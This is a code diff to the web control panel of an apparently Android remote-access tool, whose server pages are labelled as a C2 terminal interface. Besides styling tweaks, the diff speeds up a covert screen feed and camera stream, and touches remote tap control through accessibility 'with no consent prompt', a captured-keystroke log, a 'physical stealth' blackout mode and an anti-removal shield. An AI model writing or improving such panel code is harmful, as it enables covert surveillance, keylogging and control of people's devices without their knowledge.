@@ -201,7 +201,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             ".nav a {" +
             "  padding: 18px 35px;" +
             "  background: rgba(0, 242, 255, 0.05);" +
-            "  border: 1px solid rgba(0, 242, 255, 0.3);" +
+            "  border: 2px solid rgba(0, 242, 255, 0.3);" +
             "  color: var(--neon-cyan);" +
             "  text-decoration: none;" +
             "  text-transform: uppercase;" +
@@ -209,8 +209,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  font-weight: bold;" +
             "  letter-spacing: 2px;" +
             "  border-radius: 12px;" +
-            "  transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);" +
+            "  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);" +
             "  backdrop-filter: blur(5px);" +
+            "  will-change: transform, box-shadow;" +
+            "  backface-visibility: hidden;" +
             "  outline: none;" +
             "  -webkit-tap-highlight-color: transparent;" +
             "}" +
@@ -218,8 +220,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .nav a:hover {" +
             "    background: rgba(0, 242, 255, 0.15);" +
             "    border-color: var(--neon-cyan);" +
-            "    box-shadow: 0 0 20px rgba(0, 242, 255, 0.4);" +
-            "    transform: translateY(-5px);" +
+            "    box-shadow: 0 0 30px var(--neon-cyan), inset 0 0 10px var(--neon-cyan);" +
             "    color: #fff;" +
             "    cursor: pointer;" +
             "  }" +
@@ -304,9 +305,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "}" +
             ".btn-active-yellow { background: #ffff00 !important; color: #000 !important; border-color: #ffff00 !important; box-shadow: none !important; cursor: pointer; }" +
             "@media (hover: hover) {" +
-            "  button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; transform: translateY(-2px); cursor: pointer; }" +
+            "  button:hover, .btn:hover { background: rgba(255, 255, 255, 0.08) !important; box-shadow: 0 0 25px currentColor !important; cursor: pointer; }" +
             "}" +
-            "button:focus, .btn:focus, button:active, .btn:active, button:focus-visible, .btn:focus-visible {" +
+            "button:focus, .btn:focus, button:active, .btn:active, button:focus-visible, .btn:focus-visible, " +
+            ".nav a:focus, .nav a:active, .btn-back:focus, .btn-back:active {" +
             "  outline: none !important;" +
             "  box-shadow: none !important;" +
             "  background: transparent !important;" +
@@ -345,6 +347,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
             // --- MOBILE_OPTIMIZATION_PROTOCOL ---
             "@media (max-width: 768px) {" +
             "  body { overflow-x: hidden; width: 100%; font-size: 14px; margin: 0; padding: 0; -webkit-text-size-adjust: 100%; }" +
+            "  button:hover, .btn:hover, .nav a:hover, .btn-back:hover, " +
+            "  button:active, .btn:active, .nav a:active, .btn-back:active {" +
+            "    box-shadow: none !important; transform: none !important; transition: none !important; " +
+            "    background: rgba(255, 255, 255, 0.03) !important; " +
+            "  }" +
             "  .container { width: 100vw; overflow-x: hidden; padding: 10px; box-sizing: border-box; margin: 0; }" +
             "  .header { padding: 15px 0; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; gap: 0; overflow: visible; }" +
             "  .title-font { font-family: 'Orbitron', sans-serif !important; font-size: 1.71rem !important; letter-spacing: 1.5px !important; margin-right: -1.5px !important; font-weight: 900 !important; text-align: center !important; width: 100% !important; display: block !important; margin: 0 0 10px 0 !important; white-space: nowrap !important; overflow: visible !important; position: relative; z-index: 10; line-height: 1.2; }" +
@@ -382,6 +389,57 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .btn-engaged-yellow:hover { background: rgba(255, 255, 0, 0.2) !important; color: var(--neon-yellow) !important; box-shadow: 0 0 25px var(--neon-yellow) !important; }" +
             "}" +
             
+            // --- SMARTPHONE_FRAME_PROTOCOL ---
+            ".phone-frame {" +
+            "  width: 280px;" +
+            "  height: auto;" +
+            "  background: #111;" +
+            "  border-radius: 40px;" +
+            "  padding: 12px;" +
+            "  border: 4px solid #333;" +
+            "  box-shadow: 0 0 40px rgba(0,0,0,0.8), 0 0 10px rgba(0, 242, 255, 0.1);" +
+            "  margin: 0 auto;" +
+            "  position: relative;" +
+            "  overflow: visible;" +
+            "}" +
+            ".phone-frame::before {" +
+            "  content: '';" +
+            "  position: absolute;" +
+            "  top: 20px;" +
+            "  left: 50%;" +
+            "  transform: translateX(-50%);" +
+            "  width: 50px;" +
+            "  height: 6px;" +
+            "  background: #222;" +
+            "  border-radius: 10px;" +
+            "  z-index: 10;" +
+            "}" +
+            ".phone-screen {" +
+            "  width: 100%;" +
+            "  height: 100%;" +
+            "  min-height: 580px;" +
+            "  background: #000;" +
+            "  border-radius: 28px;" +
+            "  overflow: hidden;" +
+            "  position: relative;" +
+            "  border: 1px solid #222;" +
+            "  display: flex;" +
+            "  align-items: center;" +
+            "  justify-content: center;" +
+            "}" +
+            ".phone-notch {" +
+            "  position: absolute;" +
+            "  top: 0;" +
+            "  left: 50%;" +
+            "  transform: translateX(-50%);" +
+            "  width: 120px;" +
+            "  height: 25px;" +
+            "  background: #000;" +
+            "  border-bottom-left-radius: 15px;" +
+            "  border-bottom-right-radius: 15px;" +
+            "  z-index: 20;" +
+            "}" +
+            
             "textarea { resize: vertical; width: 100%; max-width: 100%; }" +
             "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
             "th { text-align: left; padding: 15px; color: var(--neon-cyan); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.7; }" +
@@ -396,22 +454,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "  .pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
             "}" +
             "@media (hover: hover) {" +
-            "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 15px var(--neon-cyan); }" +
+            "  .btn-back:hover { background: rgba(0, 242, 255, 0.1); box-shadow: 0 0 25px currentColor; border-color: currentColor; }" +
             "}" +
             ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 12px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
-            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 75%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; border-radius: 50%; background: transparent !important; }" +
+            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 75%; width: auto; z-index: 10000; opacity: 1.0; pointer-events: none; border-radius: 50%; background: transparent !important; filter: drop-shadow(0 0 8px var(--neon-cyan)); }" +
             "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\">" +
-            "    <img src=\"/logo?v=135\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
+            "    <img src=\"/logo?v=145\" class=\"watermark\" alt=\"LAB-RATS\" loading=\"eager\">" +
             "    <div class=\"title-font\">LAB-RATS</div>" +
             "    <div class=\"glitch-container\">" +
             "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
             "    </div>" +
-            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.3.5</div>" +
+            "    <div class=\"version-text\">C2_TERMINAL_INTERFACE_V1.4.5</div>" +
             "  </div>" +
             "  <div class=\"nav\">" +
             "    <a href=\"/\">Terminal</a>" +
@@ -480,10 +538,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "input:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.2); }" +
             "button { background: #00f2ff; border: none; color: #050505; padding: 18px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 3px; transition: 0.3s; border-radius: 50px; width: 100%; max-width: 280px; font-weight: 900; font-family: 'OrbitronC2', sans-serif; box-shadow: 0 0 20px rgba(0,242,255,0.4); }" +
             "button:hover { background: #fff; box-shadow: 0 0 40px rgba(0,242,255,0.6); transform: scale(1.05); }" +
+            ".login-card img { transition: all 0.5s; }" +
+            ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
             "</style></head><body>" +
             "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=135\" style=\"width: 115px; height: 115px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(0, 242, 255, 0.4)); border-radius: 50%; background: transparent !important;\">" +
+            "<img src=\"/logo?v=145\" style=\"width: 115px; height: 115px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(0, 242, 255, 0.8)); border-radius: 50%; background: transparent !important;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
+            "<div style=\"font-size:0.6rem; opacity:0.4; margin-top:-20px; margin-bottom:30px; letter-spacing:2px;\">UPLINK_PROTOCOL_V1.4.5</div>" +
             "<form onsubmit=\"handleLogin(event)\">" +
             "<input type=\"password\" id=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
             "<button type=\"submit\" id=\"uplink-btn\">UPLINK</button>" +
@@ -534,6 +595,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             "h1 { font-size: 1.8rem; }" +
             "@media (max-width: 600px) { .logout-card { padding: 25px; } h1 { font-size: 1.3rem; } p { font-size: 0.8rem; } }" +
             "p { color: #888; font-family: 'Orbitron', sans-serif; margin-top: 20px; }" +
+            ".login-card img { transition: all 0.5s; }" +
+            ".login-card img:hover { transform: scale(1.1) translateY(-5px); filter: drop-shadow(0 0 30px rgba(0, 242, 255, 1.0)); }" +
             "</style></head><body>" +
             "<div class=\"logout-card\">" +
             "<h1>SESSION_TERMINATED</h1>" +
@@ -554,6 +617,10 @@ public class LabRatsHttpServer extends NanoHTTPD {
         this.context = context;
         staticContext = context.getApplicationContext();
         
+        // Multi-Threaded Executor: Allows handling multiple C2 requests at once
+        // Prevents UI stuttering while downloading large files from the Data tab
+        setAsyncRunner(new DefaultAsyncRunner());
+
         // Generate a fresh session token for this server lifetime
         // Ensures "every reload requires a login" for security
         sessionToken = java.util.UUID.randomUUID().toString();
@@ -768,8 +835,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
             response = serveError(e.getMessage());
         }
 
-        // Global Anti-Cache Lockdown (Exclude assets to prevent flickering)
-        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/")) {
+        // Global Anti-Cache Lockdown (Exclude assets and data streams to prevent flickering)
+        if (response != null && !uri.equals("/logo") && !uri.startsWith("/font/") && !uri.equals("/ghost/screenshot") && !uri.equals("/camera/frame")) {
             response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
             response.addHeader("Pragma", "no-cache");
             response.addHeader("Expires", "0");
@@ -889,6 +956,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  async function refreshLogs() {");
         html.append("    try {");
         html.append("      const r = await fetch('/terminal/logs');");
+        html.append("      if (!r.ok) return;");
         html.append("      const logs = await r.json();");
         html.append("      const terminal = document.getElementById('log-terminal');");
         html.append("      if (!terminal) return;");
@@ -2323,10 +2391,19 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("  }");
         html.append("}");
 
-        // Refresh frame with adaptive timing
+        // Refresh frame with adaptive timing (Double Buffered)
         html.append("function refreshFrame() {");
         html.append("  if (!streamActive) return;");
-        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
+        html.append("  const buffer = new Image();");
+        html.append("  buffer.src = '/camera/frame?t=' + Date.now();");
+        html.append("  buffer.onload = () => {");
+        html.append("    if (!streamActive) return;");
+        html.append("    streamImg.src = buffer.src;");
+        html.append("    streamLoaded();");
+        html.append("  };");
+        html.append("  buffer.onerror = () => {");
+        html.append("    if (streamActive) handleStreamError();");
+        html.append("  };");
         html.append("}");
 
         // Capture photo
@@ -3668,7 +3745,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         
         html.append("<div class=\"info-item\">");
         html.append("<div class=\"info-label\">BLACKOUT_PROTOCOL</div>");
-        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight and hides system bars. <b>Note:</b> Remote feed will also be black while active.</p>");
+        html.append("<p style=\"color:#888; font-size:0.75rem; margin-top:5px; margin-bottom:10px;\">Suppresses hardware backlight and hides system bars for physical stealth. <b>Note:</b> Remote C2 feed remains visible while active.</p>");
         html.append("<div style=\"display:flex; gap:10px;\">");
         html.append("<button onclick=\"ghostAction('blackout_on')\" class=\"btn btn-small\" style=\"border-color: #fff; color: #fff;\">ACTIVATE</button>");
         html.append("<button onclick=\"ghostAction('blackout_off')\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">RESTORE</button>");
@@ -3690,13 +3767,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<p style=\"color: #888; font-size: 0.85rem; margin-bottom: 20px;\">Real-time interaction using Accessibility Triangulation (No consent prompt required).</p>");
         
         // Screen View tool
-        html.append("<div style=\"text-align: center; margin-bottom: 10px;\">");
-        html.append("<div id=\"ghost-screen-container\" style=\"position: relative; display: block; margin: 0 auto; background: #000; border: 1px solid var(--neon-cyan); border-radius: 12px; overflow: hidden; min-height: 150px; width: 100%; max-width: 270px; cursor: crosshair;\">");
-        // Improved Filter: Grayscale + Sharpened Contrast. No more green tint.
-        // Brightness is lower because we increased signal at the source (GhostService).
-        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block; margin: 0 auto; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
-        html.append("<div id=\"ghost-screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888; font-size: 0.8rem;\">COVERT_FEED_STANDBY</div>");
-        html.append("</div></div>");
+        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
+        html.append("<div class=\"phone-frame\">");
+        html.append("<div class=\"phone-notch\"></div>");
+        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
+        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
+        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px;\">OLED_STANDBY</div>");
+        html.append("</div></div></div>");
 
         // System Gestures right below the screen
         html.append("<div style=\"display:flex; justify-content:center; gap:5px; margin-bottom:20px;\">");
@@ -3756,8 +3833,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("var ghostScreenActive = false;");
         html.append("function startGhostScreen() {");
         html.append("  ghostScreenActive = true;");
-        html.append("  const container = document.getElementById('ghost-screen-container');");
-        html.append("  if (container) container.style.height = 'auto';");
+        html.append("  const status = document.getElementById('ghost-screen-status');");
+        html.append("  if (status) status.style.display = 'none';");
         html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
         html.append("  if (toggleBtn) { toggleBtn.innerText = 'TERMINATE'; toggleBtn.style.borderColor = 'var(--danger)'; toggleBtn.style.color = 'var(--danger)'; }");
         html.append("  document.getElementById('ghost-screen-status').innerHTML = 'CONNECTING...';");
@@ -3767,8 +3844,8 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("}");
         html.append("function stopGhostScreen() {");
         html.append("  ghostScreenActive = false;");
-        html.append("  const container = document.getElementById('ghost-screen-container');");
-        html.append("  if (container) container.style.height = '';");
+        html.append("  const status = document.getElementById('ghost-screen-status');");
+        html.append("  if (status) { status.style.display = 'block'; status.innerText = 'OLED_STANDBY'; }");
         html.append("  const toggleBtn = document.getElementById('ghost-toggle-btn');");
         html.append("  if (toggleBtn) { toggleBtn.innerText = 'INITIATE_VIEW'; toggleBtn.style.borderColor = 'var(--neon-green)'; toggleBtn.style.color = 'var(--neon-green)'; }");
         html.append("  document.getElementById('ghost-screen-status').innerHTML = 'COVERT_FEED_STANDBY';");
@@ -3783,16 +3860,28 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("function refreshGhostScreen() {");
         html.append("  if (!ghostScreenActive) return;");
         html.append("  const img = document.getElementById('ghost-screen-stream');");
-        html.append("  img.src = '/ghost/screenshot?t=' + Date.now();");
-        html.append("  img.onload = () => {");
-        html.append("    document.getElementById('ghost-screen-status').style.display = 'none';");
-        html.append("    setTimeout(refreshGhostScreen, 800);");
+        html.append("  const status = document.getElementById('ghost-screen-status');");
+        
+        // --- DOUBLE BUFFERING PROTOCOL ---
+        // Create an off-screen buffer to load the next frame
+        // This prevents the "flashing" or white flicker between frames.
+        html.append("  const buffer = new Image();");
+        html.append("  buffer.src = '/ghost/screenshot?t=' + Date.now();");
+        
+        html.append("  buffer.onload = () => {");
+        html.append("    if (!ghostScreenActive) return;");
+        html.append("    img.src = buffer.src;"); // Instant swap from memory
+        html.append("    if (status) status.style.display = 'none';");
+        html.append("    setTimeout(refreshGhostScreen, 200);");
         html.append("  };");
-        html.append("  img.onerror = () => {");
-        html.append("    setTimeout(refreshGhostScreen, 1000);");
+        
+        html.append("  buffer.onerror = () => {");
+        html.append("    if (ghostScreenActive) setTimeout(refreshGhostScreen, 300);");
         html.append("  };");
         html.append("}");
         html.append("var ghostDragStart = null;");
+        html.append("var lastInteractionTime = 0;");
+        
         html.append("function startGhostDrag(e) {");
         html.append("  const img = document.getElementById('ghost-screen-stream');");
         html.append("  const rect = img.getBoundingClientRect();");
@@ -3802,13 +3891,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("    t: Date.now()");
         html.append("  };");
         html.append("}");
+        
         html.append("function endGhostDrag(e) {");
         html.append("  if (!ghostDragStart) return;");
+        html.append("  const now = Date.now();");
+        html.append("  if (now - lastInteractionTime < 150) return;");
+        html.append("  lastInteractionTime = now;");
+
         html.append("  const img = document.getElementById('ghost-screen-stream');");
         html.append("  const rect = img.getBoundingClientRect();");
         html.append("  const endX = ((e.clientX - rect.left) / rect.width) * 100;");
         html.append("  const endY = ((e.clientY - rect.top) / rect.height) * 100;");
-        html.append("  const duration = Date.now() - ghostDragStart.t;");
+        html.append("  const duration = now - ghostDragStart.t;");
         html.append("  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));");
         html.append("  if (dist < 2) {");
         html.append("    fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);");
@@ -3837,7 +3931,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }");
         html.append("async function refreshGhostLogs() {");
         html.append("  try {");
-        html.append("    const r = await fetch('/ghost/keys'); const data = await r.json();");
+        html.append("    const r = await fetch('/ghost/keys');");
+        html.append("    if (!r.ok) return;");
+        html.append("    const data = await r.json();");
         html.append("    const term = document.getElementById('ghost-terminal');");
         html.append("    if(!term) return;");
         html.append("    if(data.keys.length > 0) {");
@@ -3855,7 +3951,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("}");
         html.append("async function checkGhostStatus() {");
         html.append("  try {");
-        html.append("    const r = await fetch('/ghost/status'); const data = await r.json();");
+        html.append("    const r = await fetch('/ghost/status');");
+        html.append("    if (!r.ok) return;");
+        html.append("    const data = await r.json();");
         html.append("    const card = document.getElementById('ghost-status-card');");
         html.append("    const text = document.getElementById('ghost-status-text');");
         html.append("    const prompt = document.getElementById('accessibility-prompt');");
@@ -3879,9 +3977,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("    }");
         html.append("    if (arBtn) {");
         html.append("      if (data.antiRemoval) {");
-        html.append("        arBtn.innerHTML = 'SHIELD_ACTIVE'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
+        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: ON'; arBtn.style.borderColor = 'var(--neon-green)'; arBtn.style.color = 'var(--neon-green)';");
         html.append("      } else {");
-        html.append("        arBtn.innerHTML = 'SHIELD_DISABLED'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)';");
+        html.append("        arBtn.innerHTML = 'ANTI-REMOVAL SHIELD: OFF'; arBtn.style.borderColor = 'var(--danger)'; arBtn.style.color = 'var(--danger)';");
         html.append("      }");
         html.append("    }");
         html.append("  } catch(e) {}");
